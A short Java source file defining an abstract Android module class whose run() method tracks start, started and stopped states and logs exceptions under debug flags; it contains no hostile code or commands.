package com.android.syssetup.module;

import com.android.syssetup.StateRun;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.util.Check;

public abstract class BaseInstantModule extends BaseModule {
	private static final String TAG = "BaseInstantAgent";

	public synchronized void run() {
		status = StateRun.STARTING;

		try {
			actualStart();
			status = StateRun.STARTED;
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
				Check.log(TAG + " Error: " + ex); //$NON-NLS-1$
			}
		}
		status = StateRun.STOPPED;
	}

	@Override
	public final void actualGo() {

	}

	@Override
	public final void actualStop() {

	}

}
